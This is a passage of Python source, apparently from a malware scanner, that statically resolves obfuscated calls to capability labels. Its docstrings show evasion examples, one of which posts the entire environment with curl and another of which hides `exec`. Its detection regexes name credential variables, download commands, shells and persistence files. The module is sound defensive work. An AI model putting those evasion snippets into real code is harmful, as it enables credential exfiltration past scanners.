"""Resolving Python obfuscation that a byte pattern cannot see.

Capability rules match literal syntax: `os.system`, `base64.b64decode`,
`subprocess.run`. Bind the name differently and nothing labels, so no composite
can form and the file reports clean:

    from os import environ as ENV
    from subprocess import run as go
    go(["curl", "-d", str(dict(ENV)), url])          # identical logic, silent

    __builtins__["ex" + "ec"](payload)               # `exec` is never a token
    f = os.system; f(command)                        # nor is `os.system`

Every one of those targets is derivable **without running anything**. `ast.parse`
builds a tree and executes nothing -- the same reason `ecosystems/pypi.py`
already reads `setup.py` this way -- so the alias, the binding and the folded
string are all available to a static pass. That is what this module does.

**The guarantee it exists to keep.** Static analysis cannot decide runtime
behaviour, so the spec is not "catch everything". It is:

> No evasion is silent. Every technique used to hide behaviour is either
> resolved to the real behaviour, or lights up a signal of its own.

`resolve` handles everything constant-derivable. What it cannot name --
`getattr(os, decode(blob))()`, a target read from the network -- becomes
`Capability.DYNAMIC_DISPATCH` instead, so going dynamic to escape the name match
costs the attacker a different label rather than buying silence. The residue
after both is behaviour that exists only at runtime, which no static tool
observes and which the tool should not claim to.

**It adds to the regex path, never replaces it.** The patterns stay as the fast
prefilter and as the answer for files this cannot parse -- and a file that fails
to parse says so, because silently analysing less is the failure this project
is organised against.
"""

from __future__ import annotations

import ast
import base64
import posixpath
import re
from dataclasses import dataclass
from typing import TYPE_CHECKING

from cordon_scanner.core.models import Capability

if TYPE_CHECKING:
    from collections.abc import Iterator, Sequence

# Dotted primitives, mapped to what they mean. The keys are what a resolved
# call must look like once aliases and bindings are unwound, so `go(...)` where
# `go` is `subprocess.run` arrives here as `subprocess.run`.
PRIMITIVES: dict[str, Capability] = {
    "base64.b64decode": Capability.DECODE,
    "base64.b32decode": Capability.DECODE,
    "base64.b16decode": Capability.DECODE,
    "base64.urlsafe_b64decode": Capability.DECODE,
    "base64.decodebytes": Capability.DECODE,
    "base64.standard_b64decode": Capability.DECODE,
    "base64.b32hexdecode": Capability.DECODE,
    "base64.b85decode": Capability.DECODE,
    "base64.a85decode": Capability.DECODE,
    # Python 3.13's ZeroMQ alphabet; aiolrucache's loader decodes its bytecode with it.
    "base64.z85decode": Capability.DECODE,
    "binascii.a2b_base64": Capability.DECODE,
    "binascii.unhexlify": Capability.DECODE,
    "codecs.decode": Capability.DECODE,
    "zlib.decompress": Capability.DECOMPRESS,
    "lzma.decompress": Capability.DECOMPRESS,
    "bz2.decompress": Capability.DECOMPRESS,
    "gzip.decompress": Capability.DECOMPRESS,
    "bytes.fromhex": Capability.DECODE,
    # `marshal.loads` is deliberately absent. The pattern tier labels it `execute`
    # -- a marshal stream holds code objects, so loading one is an evaluation wearing
    # a serialisation format, and `CAP.PY.EXECUTE.001` argues it at length -- and
    # labelling it `decode` here as well handed `SUSPECT.DECODE_EXEC.001` both halves
    # out of one call. CPython's own `Lib/importlib/_bootstrap_external.py` was
    # reported for it: `_compile_bytecode`'s body is `code = marshal.loads(data)`, the
    # function every `.pyc` in the world is loaded by.
    #
    # Nothing is lost by dropping the second label. The two-call forms still report,
    # because their decode comes from the other call:
    # `marshal.loads(base64.b64decode(DATA))` is base64 decoding and marshal
    # executing, and `exec(marshal.loads(base64.b64decode(blob)))` is the same with a
    # third step. Only a lone `marshal.loads(data)` goes quiet, which is the importer.
    "pickle.loads": Capability.DESERIALIZE,
    "exec": Capability.EXECUTE,
    "eval": Capability.EXECUTE,
    "compile": Capability.EXECUTE,
    "os.system": Capability.SPAWN,
    "os.popen": Capability.SPAWN,
    "os.execv": Capability.SPAWN,
    "os.execve": Capability.SPAWN,
    "os.spawnv": Capability.SPAWN,
    "subprocess.run": Capability.SPAWN,
    "subprocess.call": Capability.SPAWN,
    "subprocess.check_call": Capability.SPAWN,
    "subprocess.check_output": Capability.SPAWN,
    "os.startfile": Capability.SPAWN,
    "subprocess.getoutput": Capability.SPAWN,
    "subprocess.getstatusoutput": Capability.SPAWN,
    "subprocess.Popen": Capability.SPAWN,
    "pty.spawn": Capability.SPAWN,
    "os.environ": Capability.CREDENTIAL,
    "os.getenv": Capability.CREDENTIAL,
    "os.environb": Capability.CREDENTIAL,
    "urllib.request.urlopen": Capability.EGRESS,
    # Who and where this is, through whatever name it was imported under.
    "socket.gethostname": Capability.RECONNAISSANCE,
    "socket.getfqdn": Capability.RECONNAISSANCE,
    "getpass.getuser": Capability.RECONNAISSANCE,
    "os.getlogin": Capability.RECONNAISSANCE,
    "platform.node": Capability.RECONNAISSANCE,
    "platform.uname": Capability.RECONNAISSANCE,
    "uuid.getnode": Capability.RECONNAISSANCE,
    "urllib.request.urlretrieve": Capability.EGRESS,
    "requests.get": Capability.EGRESS,
    "requests.post": Capability.EGRESS,
    "requests.put": Capability.EGRESS,
    "requests.patch": Capability.EGRESS,
    "requests.delete": Capability.EGRESS,
    "requests.request": Capability.EGRESS,
    "httpx.get": Capability.EGRESS,
    "httpx.post": Capability.EGRESS,
    "httpx.Client": Capability.EGRESS,
    "socket.socket": Capability.EGRESS,
    "socket.create_connection": Capability.EGRESS,
    "socket.gethostbyname": Capability.EGRESS,
    "socket.getaddrinfo": Capability.EGRESS,
    "smtplib.SMTP": Capability.EGRESS,
    "ftplib.FTP": Capability.EGRESS,
    "http.client.HTTPConnection": Capability.EGRESS,
    "http.client.HTTPSConnection": Capability.EGRESS,
}

ENVIRONMENT = frozenset({"os.environ", "os.getenv", "os.environb"})
"""The environment primitives, which need a second question asked of them."""

CREDENTIAL_VARIABLE = re.compile(
    r"""(?ix)
    (?:^|[_.\-])
    (?:
        token | secret | password | passwd | passphrase | credential | credentials
      | api[_\-]?key | apikey | access[_\-]?key | private[_\-]?key | signing[_\-]?key
      | client[_\-]?secret | refresh[_\-]?token | bearer | auth | session | cookie
      | pat | sas | dsn
    )
    (?:$|[_.\-])
    """,
)
"""Environment variable names that hold credential material.

The pattern tier already draws this line and carries `os.environ.get('PORT')`
and `os.environ.get('DEBUG')` as negative tests: "reading a named setting is not
the same as serialising the whole environment, and a rule that cannot tell them
apart fires on every configuration module in existence."

This tier did not draw it, and being the AST tier it could draw it exactly -- it
has the key in hand. So every `os.getenv("HOME")`, `os.environ.get("DEBUG")` and
`os.environ["PATH"]` in existence was labelled credential access, and fed
`SUSPECT.EXFIL.001`: 675 findings across 234 of the 1,487 repositories measured,
a great many of them a module that reads its own configuration, calls an API and
starts a subprocess.

Whole-environment access stays credential access whatever the code does with it,
which is the other half of the pattern tier's rule and the half that matters:
`dict(os.environ)` is the shape that ships the lot."""

REFLECTIVE = frozenset({"getattr", "__import__", "globals", "vars", "locals"})
BUILTIN_MODULES = frozenset({"builtins", "__builtin__", "__builtins__"})
WRITE_METHODS = frozenset({"write", "write_text", "write_bytes", "writelines"})
MAX_FOLDED_CODES = 200_000
"""Character codes folded from one `map(chr, [...])`; a longer literal list is not read."""
OWN_HOST_CALLS = frozenset({"gethostname", "getfqdn", "node"})
UNSAFE_LOADERS = frozenset(
    {"torch.load", "pickle.load", "pickle.loads", "joblib.load", "dill.load", "cloudpickle.load"}
)
"""Deserialisers that execute what the file names. `pickle.loads` is here for
`pickle.loads(open(path, "rb").read())`."""

SCRIPT_LAUNCH = re.compile(
    r"(?i)(?:^|[\s\"'])[\w.@%\\/:$~-]{1,200}\.(?:exe|scr|com|bat|cmd|vbs|vbe|jse|wsf|hta|ps1|msi|sh|py|pl|rb)"
    r"(?:[\s\"']|$)"
)
"""A command that names a script or program file to run, rather than only a tool on PATH."""

EXECUTABLE_NAME = re.compile(
    r"(?i)\.(?:exe|scr|com|bat|cmd|vbs|vbe|js|jse|wsf|hta|ps1|msi|dll|sh|app)\b"
)
"""File names that a launch runs as a program."""

IDENTITY_COMMANDS = frozenset(
    {"whoami", "hostname", "id", "uname", "hostnamectl", "ipconfig", "ifconfig"}
)
"""Commands whose whole output is this machine's or this user's identity."""

DNS_LOOKUPS = frozenset(
    {"socket.gethostbyname", "socket.gethostbyname_ex", "socket.getaddrinfo", "socket.getfqdn"}
)

PERSISTENCE_PATH = re.compile(
    r"(?:^|/)\.(?:profile|bashrc|bash_profile|bash_login|zshrc|zprofile|zlogin)$"
    r"|LaunchAgents/[^/]{1,200}\.plist$|/crontabs?/|systemd/user/[^/]{1,200}\.service$"
)
"""Files that run their contents at the next login, boot or schedule."""

DOWNLOAD_TO = re.compile(
    r"""(?i)\b(?:curl(?:\.exe)?|wget|invoke-webrequest|iwr)\b[^\n]{0,400}?"""
    r"""\s(?:-o|--output|--output-document|-outfile)\s{1,4}"""
    r"""(?P<target>"[^"]{1,300}"|'[^']{1,300}'|\S{1,300})"""
)
"""A command that downloads to a named file, and that file."""

FETCH_TOOL = re.compile(r"(?i)^\s{0,8}(?:curl|wget|invoke-webrequest|iwr)\b")
"""A command whose output is the download."""

SHELL_NAMES = frozenset(
    {"powershell", "powershell.exe", "pwsh", "sh", "bash", "zsh", "dash", "cmd", "cmd.exe"}
)
RUNNER_WORDS = frozenset({"start-process", "saps", "invoke-item", "ii", "&"})
"""PowerShell verbs whose first argument is the program they run."""


def _word_key(word: str) -> str:
    """A command word as `_file_key` names a file: `"{out}"` is the variable `out`."""
    text = word.strip().strip("\"'")
    placeholder = re.fullmatch(r"\{(\w{1,80})\}", text)
    return f"name:{placeholder.group(1)}" if placeholder else text


INTERPRETER_NAMES = frozenset(
    {
        "python",
        "python3",
        "python2",
        "python.exe",
        "pythonw",
        "pythonw.exe",
        "py",
        "sh",
        "bash",
        "zsh",
        "dash",
        "node",
        "perl",
        "ruby",
        "php",
        "pwsh",
        "powershell",
        "powershell.exe",
        "cmd",
        "cmd.exe",
        "wscript",
        "cscript",
        "msiexec",
        "rundll32",
        "start",
    }
)
"""Programs whose first non-option argument is the code they run."""
BASE64_DECODERS = frozenset(
    {
        "base64.b64decode",
        "base64.standard_b64decode",
        "base64.urlsafe_b64decode",
        "base64.decodebytes",
    }
)
WRITTEN_CODE_MIN = 16
WRITTEN_CODE_MAX = 64 * 1024
"""A literal shorter than this holds no call worth reading; one longer is not analysed again,
which bounds the cost of a file built from large embedded payloads."""
"""Names whose whole purpose is to reach something by a computed name.

Resolved when the name is constant, and reported as dynamic dispatch when it is
not."""

DANGEROUS_NAMESPACES = frozenset({"os", "subprocess", "sys", "builtins", "__builtins__", "shutil"})
"""Namespaces where reflective access with a computed name has no benign
analogue worth the silence. `getattr(self, method_name)` on a plugin object is
ordinary; `getattr(os, something_decoded)` is not."""


@dataclass(frozen=True, slots=True)
class AstHit:
    """One capability resolved from the tree, with where it was seen."""

    capability: Capability
    line: int
    detail: str
    column: int = 0
    """Byte offset of the call within its line, 0-based. Carried for the same
    reason as `AstCall.column`: a composite's byte-distance bound needs the true
    position, not the start of the line, or a minified one-line file collapses
    every hit to the same place."""
    command: str | None = None
    """The command string handed to a spawn primitive, when it is derivable.

    A shell command written as a Python string is data to every language pack:
    the Python rules see a string, and the shell rules never run on a `.py`
    file. Carrying it here is what lets the shell rules be applied to the one
    place in the file where a string is unambiguously a command."""

    fixed_command: bool = False
    """Whether EVERY part of that command was a literal in the source.

    `command` is filled in when any part resolves, because a partially resolved
    command is still worth matching shell rules against. This is the stricter
    question, and a different one: a spawn whose whole argv is written out cannot
    be running anything the file decoded or downloaded, because what it runs is
    visible in the file.

    False for a command mentioning a temporary or relative path, which is where a
    dropped payload lands: `subprocess.run(["/tmp/update"])` is a constant argv and
    is also the second half of a dropper."""


@dataclass(frozen=True, slots=True)
class Assembled:
    """A string value built by concatenation, and what it evaluates to.

    Carried separately from capabilities because it answers a different
    question: not what this code can do, but what value it contains that no
    contiguous pattern can see.
    """

    value: str
    line: int
    name: str | None
    """The name it was assigned to, when it was assigned to one."""

    assembled: bool = True
    """Whether the value was built from more than one piece.

    A plain literal is carried too, because Python joins adjacent literals with
    no operator and the byte scan cannot see the joined value. But the two are
    not equivalent evidence: the entropy heuristic's whole justification is that
    building a value out of pieces is not how a URL or an identifier is written,
    and applying it to every constant in a file reports every long URL as a
    credential. Provider shapes and known prefixes apply to both."""


@dataclass(frozen=True, slots=True)
class AstCall:
    """One call site, with its callee resolved and its arguments folded.

    The difference between this and the source text is the whole point of the
    `ast` match kind. `f = os.system; f(cmd)` produces `name="os.system"`, and
    so does `getattr(os, "sys" + "tem")(cmd)` -- neither of which any pattern
    over the bytes can see, because in the first the call site says `f` and in
    the second the primitive's name does not appear in the file at all.
    """

    name: str
    """The callee's dotted name, resolved through imports, aliases, local
    bindings and `getattr`. `""` when it could not be resolved."""

    line: int

    column: int = 0
    """Byte offset of the call within its line, 0-based.

    Carried so a composite's proximity check can measure the true distance
    between two call sites rather than treating both as the start of their line.
    On a minified bundle the whole file is one line, and without this every call
    collapses to the same position -- which is how a decode and an execution
    four thousand bytes apart came to satisfy a rule that asks for them in the
    same breath."""

    arguments: tuple[str, ...] = ()
    """Positional arguments folded to their constant values, in order.

    `""` for an argument that is not a derivable constant, so position is
    preserved -- a query about argument 1 must not silently read argument 2
    because argument 0 was a variable. A list or tuple argument folds to its
    elements joined by a space, which is how `["sh", "-c", "..."]` and
    `"sh -c ..."` become the same string to a rule author."""

    keywords: tuple[tuple[str, str], ...] = ()
    """Keyword arguments, folded the same way. Present so a rule can say
    `shell=True` without caring where in the call it was written."""

    has_constructed_argument: bool = False
    """Whether any argument is a BUILT expression rather than a literal or name.

    A concatenation, an f-string, a `.format()`, a slice, or a nested call.
    This is what separates `resolve("api.example.com")` -- a name written in
    the source -- from `resolve(blob[i:i+60] + ".exfil.invalid")`, where the
    hostname carries program data. The regex tier draws the same line by
    requiring a `+`, `%` or f-string after the resolver call; carrying it here
    lets an `ast` rule stay that precise while seeing through an aliased
    import, which the regex cannot."""

    @property
    def argument_text(self) -> str:
        """Every resolved argument as one string, for a pattern to run over."""
        parts = [a for a in self.arguments if a]
        parts.extend(f"{k}={v}" for k, v in self.keywords if v)
        return " ".join(parts)


class PythonAnalyzer:
    """Resolves capability primitives through aliases, bindings and constants."""

    def __init__(self) -> None:
        # Alias -> dotted primitive. `import base64 as b` gives `b -> base64`;
        # `from os import system as s` gives `s -> os.system`.
        self._aliases: dict[str, str] = {}
        # Local name -> dotted primitive, from `f = os.system`.
        self._bindings: dict[str, str] = {}
        # Inner call -> the call that invokes its result. `getattr(os, "system")`
        # resolves to a primitive, but the command it is handed belongs to the
        # enclosing `(...)`, so the two nodes have to be related to read it.
        self._invoked: dict[int, ast.Call] = {}
        # Names whose every possible value is written in the file. See `_enumerated`.
        self._enumerated: set[str] = set()
        self._follow_literals = True
        # Name -> the string literal it is bound to, for names bound exactly once.
        self._strings: dict[str, str | None] = {}
        # Name -> the f-string or concatenation it is bound to, for names bound exactly once.
        self._sketches: dict[str, ast.AST] = {}
        # Names bound to a path built from `__file__`. See `_loads_a_bundled_file`.
        self._bundled_paths: set[str] = set()
        # Names bound to the text of a local file. See `_read_from_local_file`.
        self._local_reads: set[str] = set()
        # Lines whose `exec`/`eval` runs the package's own file. See `own_file_exec_lines`.
        self._excused_lines: set[int] = set()
        self._sketched: set[str] = set()
        self._hits: list[AstHit] = []

    @classmethod
    def analyse(cls, source: str, *, follow_literals: bool = True) -> list[AstHit]:
        """Capabilities resolvable from this source, or none if it will not parse.

        `follow_literals=False` leaves code held in string literals unread (see `_written_code`).
        A test suite writes code fixtures to disk as its ordinary business, and what such a
        fixture would do is not something the suite does.
        """
        try:
            tree = ast.parse(source)
        except (SyntaxError, ValueError, RecursionError):
            return []
        analyzer = cls()
        analyzer._follow_literals = follow_literals
        analyzer._collect_names(tree)
        analyzer._walk(tree)
        analyzer._downloaded_and_run(tree)
        analyzer._identity_sent(tree)
        return analyzer._hits

    def _environment_handed_to_children(self, tree: ast.AST) -> set[int]:
        """`os.environ` nodes whose whole-environment copy only ever becomes a child's environment.

        `env = os.environ.copy(); env.update(extra); subprocess.call(cmd, env=env)` -- nodeenv,
        and every build script that sets one variable for a compiler. The copy is the parent's
        environment handed to its own child, which inherits it anyway; nothing is read out of
        it. Accepted holders: `X = os.environ.copy()`, `X = dict(os.environ, ...)`,
        `X = {**os.environ, ...}`, `X.update(os.environ)`, or the read written straight into
        `env=`. Every other use of the holder -- serialised, sent, iterated, returned -- keeps
        the read a whole-environment read.
        """
        # Keyed by (enclosing function, name): `env` is the usual name, and one function's
        # hand-off says nothing about what another function does with its own `env`.
        environ_nodes: dict[tuple[int, str], list[int]] = {}
        direct: set[int] = set()
        parents: dict[int, ast.AST] = {}
        for node in ast.walk(tree):
            for child in ast.iter_child_nodes(node):
                parents[id(child)] = node

        def scope_of(node: ast.AST) -> ast.AST:
            current = parents.get(id(node))
            while current is not None and not isinstance(
                current, ast.FunctionDef | ast.AsyncFunctionDef | ast.Lambda
            ):
                current = parents.get(id(current))
            return current if current is not None else tree

        def is_environ(node: ast.AST) -> bool:
            return self._dotted(node) in ENVIRONMENT

        for node in ast.walk(tree):
            if not is_environ(node):
                continue
            parent = parents.get(id(node))
            copy: ast.AST | None = None
            if isinstance(parent, ast.Attribute) and parent.attr == "copy":
                call = parents.get(id(parent))
                copy = call if isinstance(call, ast.Call) and call.func is parent else None
            elif (
                isinstance(parent, ast.Call)
                and isinstance(parent.func, ast.Name)
                and parent.func.id == "dict"
                and parent.args
                and parent.args[0] is node
            ) or (isinstance(parent, ast.Dict) and None in parent.keys):
                copy = parent
            elif (
                isinstance(parent, ast.Call)
                and isinstance(parent.func, ast.Attribute)
                and parent.func.attr == "update"
                and isinstance(parent.func.value, ast.Name)
            ):
                environ_nodes.setdefault((id(scope_of(node)), parent.func.value.id), []).append(
                    id(node)
                )
                continue
            elif isinstance(parent, ast.keyword) and parent.arg == "env":
                direct.add(id(node))
                continue
            if copy is None:
                continue
            holder = parents.get(id(copy))
            if isinstance(holder, ast.keyword) and holder.arg == "env":
                direct.add(id(node))
            elif (
                isinstance(holder, ast.Assign)
                and len(holder.targets) == 1
                and isinstance(holder.targets[0], ast.Name)
            ):
                environ_nodes.setdefault((id(scope_of(node)), holder.targets[0].id), []).append(
                    id(node)
                )

        def harmless(use: ast.Name) -> bool:
            parent = parents.get(id(use))
            if isinstance(parent, ast.keyword) and parent.arg == "env":
                return True
            if isinstance(parent, ast.Attribute) and parent.value is use:
                return parent.attr in {"update", "setdefault", "pop", "get", "copy", "__setitem__"}
            if isinstance(parent, ast.Subscript) and parent.value is use:
                return True
            if isinstance(parent, ast.Assign) and parent.value is use:
                return all(
                    isinstance(t, ast.Subscript) and self.constant(t.slice) == "env"
                    for t in parent.targets
                )
            if isinstance(parent, ast.Dict):
                index = next((i for i, v in enumerate(parent.values) if v is use), None)
                key = parent.keys[index] if index is not None else None
                return key is not None and self.constant(key) == "env"
            return False

        excused = set(direct)
        for (scope, name), nodes in environ_nodes.items():
            uses = [
                n
                for n in ast.walk(tree)
                if isinstance(n, ast.Name)
                and n.id == name
                and isinstance(n.ctx, ast.Load)
                and id(scope_of(n)) == scope
            ]
            if uses and all(harmless(use) for use in uses):
                excused.update(nodes)
        return excused

    def _iterated_literals(self, tree: ast.AST) -> dict[str, list[str]]:
        """Loop variables whose every value is a string literal, with those values.

        From `for n in (...)` and comprehensions, iterating either a literal tuple or list, or a
        name bound once to one. A name used as a loop variable twice, over different things, is
        left out rather than guessed at."""
        sequences: dict[str, list[str]] = {}
        assigned: dict[str, int] = {}
        for node in ast.walk(tree):
            if isinstance(node, ast.Assign):
                for target in node.targets:
                    if isinstance(target, ast.Name):
                        assigned[target.id] = assigned.get(target.id, 0) + 1
                        values = self._literal_strings(node.value)
                        if values is not None:
                            sequences[target.id] = values

        def resolved(iterable: ast.AST) -> list[str] | None:
            values = self._literal_strings(iterable)
            if values is None and isinstance(iterable, ast.Name) and assigned.get(iterable.id) == 1:
                values = sequences.get(iterable.id)
            return values

        found: dict[str, list[str]] = {}
        refused: set[str] = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.For | ast.comprehension) and isinstance(node.target, ast.Name):
                name = node.target.id
                values = resolved(node.iter)
                if values is None or (name in found and found[name] != values):
                    refused.add(name)
                else:
                    found[name] = values
        return {name: values for name, values in found.items() if name not in refused}

    @staticmethod
    def _literal_strings(node: ast.AST) -> list[str] | None:
        if not isinstance(node, ast.Tuple | ast.List) or not node.elts:
            return None
        values = [
            e.value for e in node.elts if isinstance(e, ast.Constant) and isinstance(e.value, str)
        ]
        return values if len(values) == len(node.elts) else None

    @classmethod
    def excused_lines(cls, source: str) -> dict[Capability | str, frozenset[int]]:
        """Lines where the pattern tier's match is a known-harmless form this tier can see.

        `exec` of text read from the package's own file (EXECUTE), and the whole environment
        copied only to become a child process's environment (CREDENTIAL). The pattern tier sees
        `exec(` and `os.environ` and cannot tell what follows; the caller drops its hits on these
        lines and keeps every other."""
        try:
            tree = ast.parse(source)
        except (SyntaxError, ValueError, RecursionError):
            return {}
        analyzer = cls()
        analyzer._collect_names(tree)
        analyzer._walk(tree)
        handed = analyzer._environment_handed_to_children(tree)
        environment = {
            node.lineno for node in ast.walk(tree) if id(node) in handed and hasattr(node, "lineno")
        }
        # A line that also reads the environment some other way keeps its pattern hit.
        environment -= {
            node.lineno
            for node in ast.walk(tree)
            if analyzer._dotted(node) in ENVIRONMENT
            and id(node) not in handed
            and hasattr(node, "lineno")
        }
        own_name = frozenset(
            node.lineno
            for node in ast.walk(tree)
            if isinstance(node, ast.Call)
            and (analyzer._dotted(node.func) or "") in DNS_LOOKUPS
            and node.args
            and cls._own_name_locally(node.args[0])
        )
        return {
            "CAP.EGRESS.DNS_CONSTRUCTED.001": own_name,
            Capability.EXECUTE: frozenset(analyzer._excused_lines),
            Capability.CREDENTIAL: frozenset(environment),
            Capability.DECODE: analyzer._decoded_into_data_parsers(tree),
        }

    DATA_PARSERS = frozenset({"ast.literal_eval", "literal_eval", "json.loads", "json.load"})
    """Parsers that turn text into values and cannot run any of it. `pickle` and `marshal` are
    not here: loading either can execute code."""

    def _decoded_into_data_parsers(self, tree: ast.AST) -> frozenset[int]:
        """Lines whose every decode is handed straight to a data parser.

        reportlab's `literal_eval(base64_decodebytes(label.encode()).decode())` reads a label
        back into a tuple; nothing decoded there can run. A line with any other decode keeps
        its hit."""
        parsed: set[int] = set()
        other: set[int] = set()
        parents: dict[int, ast.AST] = {}
        for node in ast.walk(tree):
            for child in ast.iter_child_nodes(node):
                parents[id(child)] = node
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            dotted = self._dotted(node.func)
            if dotted is None or PRIMITIVES.get(dotted) is not Capability.DECODE:
                continue
            current: ast.AST = node
            parent = parents.get(id(current))
            # Through `.decode(...)`, `.strip()` and the like on the decoded bytes.
            while (
                isinstance(parent, ast.Attribute)
                and isinstance(parents.get(id(parent)), ast.Call)
                and parent.attr in {"decode", "strip", "rstrip", "lstrip"}
            ):
                current = parents[id(parent)]
                parent = parents.get(id(current))
            consumer = self._dotted(parent.func) if isinstance(parent, ast.Call) else None
            (parsed if consumer in self.DATA_PARSERS else other).add(node.lineno)
        return frozenset(parsed - other)

    @classmethod
    def calls(cls, source: str) -> list[AstCall]:
        """Every call in this source, with callee and arguments resolved.

        The same resolution `analyse` applies to the fixed `PRIMITIVES` table,
        exposed for rules to query instead. That table is this module's own
        list of what matters; a rule pack needs to name its own.

        Unparseable source yields nothing, which the caller must treat as "not
        examined" rather than "nothing here" -- the regex tier still runs over
        the same file, which is why this is an addition to it and never a
        replacement.
        """
        try:
            tree = ast.parse(source)
        except (SyntaxError, ValueError, RecursionError):
            return []
        analyzer = cls()
        analyzer._collect_names(tree)
        # `_invoked` maps an inner call to the call that invokes its result, so
        # `getattr(os, "system")("...")` can find the argument list that belongs
        # to the outer parentheses.
        for node in ast.walk(tree):
            if isinstance(node, ast.Call) and isinstance(node.func, ast.Call | ast.Subscript):
                analyzer._invoked[id(node.func)] = node

        # What each plain name is assigned, so a hostname assembled into a variable on one line
        # and resolved on the next reads as the built value it is.
        assigned: dict[str, list[ast.AST]] = {}
        for node in ast.walk(tree):
            if isinstance(node, ast.Assign):
                for target in node.targets:
                    if isinstance(target, ast.Name):
                        assigned.setdefault(target.id, []).append(node.value)

        def constructed(argument: ast.AST) -> bool:
            if cls._is_constructed(argument):
                return True
            values = assigned.get(argument.id, []) if isinstance(argument, ast.Name) else []
            return bool(values) and all(
                cls._is_constructed(value) and cls._has_dotted_literal(value) for value in values
            )

        found: list[AstCall] = []
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            resolved = analyzer._resolve_callee(node)
            if resolved is None:
                continue
            name, callsite = resolved
            found.append(
                AstCall(
                    name=name,
                    line=getattr(node, "lineno", 0),
                    column=getattr(node, "col_offset", 0),
                    arguments=tuple(analyzer._argument_value(a) for a in callsite.args),
                    keywords=tuple(
                        (kw.arg, analyzer._argument_value(kw.value))
                        for kw in callsite.keywords
                        if kw.arg
                    ),
                    has_constructed_argument=any(constructed(a) for a in callsite.args),
                )
            )
        return found

    @staticmethod
    def _has_dotted_literal(node: ast.AST) -> bool:
        """Whether a built value carries a literal domain suffix: `x + ".lib.example.com"`."""
        return any(
            isinstance(part, ast.Constant)
            and isinstance(part.value, str)
            and "." in part.value.strip(".")
            for part in ast.walk(node)
        )

    @staticmethod
    def _is_constructed(node: ast.AST) -> bool:
        """Whether an argument is BUILT rather than named or written whole.

        A concatenation, an interpolation, a `.format()`, a slice or a nested
        call -- the shapes that carry runtime data into an argument. A plain
        literal, a bare name and an attribute access are not constructed: those
        are how ordinary code passes a fixed host or a variable.
        """
        # A folds-to-a-constant expression is a literal written in pieces, not a
        # value built at runtime: `"api." + ".example.com"` is the fixed string
        # `"api..example.com"`. Only an expression that pulls in a name, a call
        # or a slice carries runtime data, so a fully constant one is not
        # "constructed" for this purpose -- otherwise a resolver call with a
        # hostname spelled as two adjacent literals reads as exfiltration.
        if PythonAnalyzer.constant(node) is not None:
            return False
        if PythonAnalyzer._own_name_locally(node):
            return False
        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add | ast.Mod):
            return True
        if isinstance(node, ast.JoinedStr | ast.Subscript):
            return True
        if isinstance(node, ast.Call):
            func = node.func
            if isinstance(func, ast.Attribute) and func.attr in {"format", "join"}:
                return True
            # Resolving this machine's own name -- `gethostbyname(socket.gethostname())` -- is
            # how a program finds its address; xgboost's tracker and jupyter_client both do it.
            # The name was built by nobody.
            callee = (
                func.attr
                if isinstance(func, ast.Attribute)
                else func.id
                if isinstance(func, ast.Name)
                else ""
            )
            # Otherwise a nested call whose value becomes the argument -- `tohex(host())`.
            return callee not in OWN_HOST_CALLS
        return False

    LOCAL_SUFFIXES = (".local", ".localdomain", ".lan", ".home.arpa", ".internal")
    """Suffixes that name this machine on its own network and are never sent to a public
    resolver's operator: mDNS's `.local` and the reserved home and internal zones."""

    @staticmethod
    def _own_name_locally(node: ast.AST) -> bool:
        """`socket.gethostname() + ".local"` -- this machine's own name in a local-only zone, which
        jupyter_client resolves when the bare hostname maps to loopback. No data travels in it."""
        if not (isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add)):
            return False
        suffix = PythonAnalyzer.constant(node.right)
        func = node.left.func if isinstance(node.left, ast.Call) else None
        callee = (
            func.attr
            if isinstance(func, ast.Attribute)
            else func.id
            if isinstance(func, ast.Name)
            else ""
        )
        return (
            callee in OWN_HOST_CALLS
            and suffix is not None
            and suffix.lower() in PythonAnalyzer.LOCAL_SUFFIXES
        )

    def _resolve_callee(self, node: ast.Call) -> tuple[str, ast.Call] | None:
        """This call's dotted name, and the call whose arguments belong to it.

        The two differ for reflective dispatch: in `getattr(os, "system")(cmd)`
        the name comes from the inner call and `cmd` from the outer one.
        """
        dotted = self._dotted(node.func)
        base = dotted.split(".")[-1] if dotted else None

        if base in REFLECTIVE:
            namespace = self._dotted(node.args[0]) if node.args else None
            attribute = self.constant(node.args[1]) if len(node.args) > 1 else None
            if namespace and attribute is not None:
                return f"{namespace}.{attribute}", self._invoked.get(id(node), node)
            return None

        return (dotted, node) if dotted else None

    def _argument_value(self, node: ast.AST) -> str:
        """One argument folded to a string, or `""` if it is not derivable.

        A sequence folds to its elements joined by a space so that
        `subprocess.run(["sh", "-c", payload])` and `os.system("sh -c ...")`
        read the same to a rule, which is the point: they are the same act
        written two ways, and a rule author should not have to write it twice.
        """
        if isinstance(node, ast.List | ast.Tuple):
            parts = [self.constant(element) or "" for element in node.elts]
            return " ".join(p for p in parts if p)
        # `constant` answers "what string is this", and deliberately returns
        # None for a bool or a number -- it exists to fold names and commands.
        # A rule asking about `shell=True` is asking about a literal that is
        # not a string, so it is rendered here rather than widening `constant`
        # for every other caller.
        if isinstance(node, ast.Constant) and isinstance(node.value, bool | int | float):
            return str(node.value)
        return self.constant(node) or ""

    @classmethod
    def assembled(cls, source: str) -> list[Assembled]:
        """String values built by concatenation, folded to what they evaluate to.

        A credential regex needs a contiguous literal, and `"ghp_" + "..."` is
        not one. The value is identical to the interpreter and invisible to the
        pattern, which makes splitting a token across a `+` the cheapest way to
        commit a live credential past a secret scanner.

        Returns every derivable string value, including plain literals. That
        looks redundant against the byte-level pattern pass and is not: adjacent
        string literals in Python concatenate with no operator, so `("ghp_"
        "rest")` is a single constant to the parser and two separate quoted runs
        in the file. Deduplication happens in the caller, which hashes the value
        rather than its spelling.
        """
        try:
            tree = ast.parse(source)
        except (SyntaxError, ValueError, RecursionError):
            return []

        found: list[Assembled] = []

        for node in ast.walk(tree):
            targets: list[str] = []
            if isinstance(node, ast.Assign):
                value: ast.AST | None = node.value
                targets = [t.id for t in node.targets if isinstance(t, ast.Name)]
            elif isinstance(node, ast.AnnAssign | ast.AugAssign):
                value = node.value
                targets = [node.target.id] if isinstance(node.target, ast.Name) else []
            else:
                continue

            if value is None:
                continue

            # Plain constants are included, and that is not redundant with the
            # byte scan. Python concatenates adjacent literals with no operator
